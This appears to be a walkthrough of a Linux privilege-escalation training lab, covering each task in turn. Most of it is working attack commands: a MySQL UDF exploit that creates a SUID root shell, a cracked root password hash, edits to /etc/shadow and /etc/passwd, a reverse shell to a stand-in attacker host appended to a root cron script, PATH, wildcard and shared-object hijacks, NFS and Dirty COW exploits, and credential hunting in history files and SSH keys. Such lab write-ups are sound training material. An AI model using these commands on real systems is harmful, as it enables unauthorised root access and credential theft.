# Linux PrivEsc
---

**Task 1:**
- Deploy the target machine and login through SSH `ssh user@IP`
- run `id` command to get the answer:
	`uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)`



**Task 2 (Service Exploit - MySQL):**
- I quickly check for running process using `ps aux`
	`root      2421  0.0  1.1 165472 24344 ?        Sl   10:33   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/v`
	
- as the task itself states that mysql is running but you can cross varify it through it.
- Once we know the service is running with a root privilege, we will try to escalate our privilege using those services

Change into the /home/user/tools/mysql-udf directory:

`cd /home/user/tools/mysql-udf`

Compile the raptor_udf2.c exploit code using the following commands:
`
`gcc -g -c raptor_udf2.c -fPIC``
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
`
Connect to the MySQL service as the root user with a blank password:

`mysql -u root`

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

`use mysql;`
`create table foo(line blob);`
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
`create function do_system returns integer soname 'raptor_udf2.so';`

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`



**Task 3: Weak File permission - Readable /etc/shadow**
- the /etc/shadow file is world readable 
	`cat /etc/shadow`
	`hash=  $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298`

- hashing algorithm used is `sha512crypt`

- save the hash in a file `hash.txt`
- now we will use john the ripper to crack the hash `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	
	password: password123

- `su root` and then enter the password. 



**Task 4: Weak File permission - Writable /etc/shadow**
- If /etc/shadow file is writable that means we can change the password hashes of the root or other users on the system and then can use the new passwords to gain higher privileges.
- use `mkpasswd -m sha-512 newpasswordhere`, you will get a hash of the password you enter
- then `nano /etc/shadow` and then replace the new password's hash with the old one
- `su root`, enter new password and that's it



**Task 5: Weak File Permission - Writable /etc/passwd** 
- Note that the /etc/passwd file is world-writable:

	`ls -l /etc/passwd`

- Generate a new password hash with a password of your choice:

	`openssl passwd newpasswordhere`

- Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

- Switch to the root user, using the new password:

	`su root`

- Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").  

- Now switch to the newroot user, using the new password:

	`su newroot`


**Task 6: Sudo - shell escape sequence**
- How many programs is "user" allowed to run via sudo?
	Ans: `sudo -l` and count the number of programs shown
	Ans: 11


- One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
	Ans: apache2


User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more


Escalating using sudo nmap:
- Run `sudo nmap --interactive` and then `!sh` and you will have root shell

We can also use other services and programs to escalate just do some research on them


### Cron Job Exploits

- **Task 8: Cron Jobs - File Permissions**
    
    - **Concept:** Modifying a world-writable script or binary executed periodically as `root` by a scheduled cron job.
        
    - **Commands:**
        
        Bash
        
        ```
        # Inspect system-wide cron jobs and check script permissions
        cat /etc/crontab
        ls -la /usr/local/bin/overwrite.sh
        
        # Append a reverse shell payload to the writable cron script
        echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /usr/local/bin/overwrite.sh
        ```
        
- **Task 9: Cron Jobs - PATH Environment Variable**
    
    - **Concept:** Hijacking execution when a root cron job invokes a binary without its full path, allowing a malicious executable placed earlier in the `PATH` to run instead.
        
    - **Commands:**
        
        Bash
        
        ```
        # Check PATH order in crontab
        cat /etc/crontab
        
        # Create a malicious script in a writable directory listed early in PATH (e.g., /home/user)
        echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /home/user/overwrite.sh
        chmod +x /home/user/overwrite.sh
        
        # Once the cron job runs, execute the SUID bash copy
        /tmp/rootbash -p
        ```
        
- **Task 10: Cron Jobs - Wildcards**
    
    - **Concept:** Abusing wildcard (`*`) expansion in root cron commands (such as `tar`) by creating files named like command-line flags to execute arbitrary scripts.
        
    - **Commands:**
        
        Bash
        
        ```
        # Create payload script and checkpoint flag files in the target directory (e.g., /home/user)
        echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /home/user/runme.sh
        chmod +x /home/user/runme.sh
        touch /home/user/--checkpoint=1
        touch /home/user/--checkpoint-action=exec=sh\ runme.sh
        
        # Execute the resulting SUID shell after cron runs
        /tmp/rootbash -p
        ```
        

### SUID / SGID Executables

- **Task 11: SUID / SGID Executables - Known Exploits**
    
    - **Concept:** Finding binaries with the SUID/SGID bit set and exploiting known vulnerabilities in outdated versions (such as `exim-4.84-3`).
        
    - **Commands:**
        
        Bash
        
        ```
        # Enumerate all SUID/SGID binaries
        find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
        
        # Run the local exploit for the vulnerable SUID binary (e.g., Exim)
        /usr/sbin/exim -v -qff
        ```
        
- **Task 12: SUID / SGID Executables - Shared Object Injection**
    
    - **Concept:** Tracing a SUID binary for missing `.so` shared libraries in writable directories and compiling a malicious shared object to spawn a root shell.
        
    - **Commands:**
        
        Bash
        
        ```
        # Trace missing shared objects
        strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
        
        # Compile a malicious shared library (libcalc.c) into the missing path
        gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
        /usr/local/bin/suid-so
        ```
        
- **Task 13: SUID / SGID Executables - Environment Variables**
    
    - **Concept:** Exploiting SUID binaries (`/usr/local/bin/suid-env`) that call system commands (`service`) without an absolute path by manipulating `PATH`.
        
    - **Commands:**
        
        Bash
        
        ```
        # Inspect strings inside the binary
        strings /usr/local/bin/suid-env
        
        # Compile a malicious 'service' binary and prepend '.' to PATH
        echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
        gcc /tmp/service.c -o /tmp/service
        PATH=/tmp:$PATH /usr/local/bin/suid-env
        ```
        
- **Task 14: SUID / SGID Executables - Abusing Shell Features (#1)**
    
    - **Concept:** Exploiting `/usr/local/bin/suid-env2` on Bash versions **less than 4.2-048** by exporting a function named after the full executable path (`/usr/sbin/service`).
        
    - **Commands:**
        
        Bash
        
        ```
        function /usr/sbin/service { /bin/bash -p; }
        export -f /usr/sbin/service
        /usr/local/bin/suid-env2
        ```
        
- **Task 15: SUID / SGID Executables - Abusing Shell Features (#2)**
    
    - **Concept:** Using Bash debugging variables (`SHELLOPTS=xtrace` and `PS4`) in Bash versions **less than 4.4** to execute commands as root when a SUID binary invokes a shell.
        
    - **Commands:**
        
        Bash
        
        ```
        env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
        /tmp/rootbash -p
        ```
        

### Credentials, Services & Kernel

- **Task 16: Passwords & Keys - History Files**
    
    - **Concept:** Inspecting hidden shell/application history files in the user's home directory for accidentally logged plaintext passwords (such as a `mysql` CLI login).
        
    - **Commands:**
        
        Bash
        
        ```
        cat ~/.*history | less
        su root
        ```
        
- **Task 17: Passwords & Keys - Config Files**
    
    - **Concept:** Checking readable configuration files (such as OpenVPN configs or auth files) for stored root credentials.
        
    - **Commands:**
        
        Bash
        
        ```
        ls -la /home/user
        cat /home/user/myvpn.ovpn
        su root
        ```
        
- **Task 18: Passwords & Keys - SSH Keys**
    
    - **Concept:** Finding world-readable private SSH keys (e.g., `/root/.ssh/id_rsa` or backup keys) and authenticating as root over SSH.
        
    - **Commands:**
        
        Bash
        
        ```
        find / -name "id_rsa*" 2>/dev/null
        chmod 600 id_rsa
        ssh -i id_rsa root@127.0.0.1
        ```
        
- **Task 19: NFS**
    
    - **Concept:** Exploiting an NFS export configured with `no_root_squash` by mounting the share on an attacker machine as root, creating a SUID shell binary, and executing it on the target.
        
    - **Commands:**
        
        Bash
        
        ```
        # On target: check NFS exports
        cat /etc/exports
        
        # On attacker machine (as root): mount share and create SUID binary
        mkdir /tmp/nfs
        mount -o rw,vers=2 <TARGET_IP>:/tmp /tmp/nfs
        msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
        chmod +xs /tmp/nfs/shell.elf
        
        # On target: run the SUID binary
        /tmp/shell.elf
        ```
        
- **Task 20: Kernel Exploits**
    
    - **Concept:** Identifying a vulnerable Linux kernel version and compiling/running a local privilege escalation exploit (such as Dirty COW / CVE-2016-5195).
        
    - **Commands:**
        
        Bash
        
        ```
        uname -a
        gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
        ./c0w
        passwd
        ```
        
- **Task 21: Privilege Escalation Scripts**
    
    - **Concept:** Running automated enumeration scripts (such as `linpeas.sh` or `LinEnum.sh`) to automatically scan and highlight privilege escalation paths across the system.
        
    - **Commands:**
        
        Bash
        
        ```
        chmod +x /home/user/tools/privesc-scripts/linpeas.sh
        /home/user/tools/privesc-scripts/linpeas.sh
        ```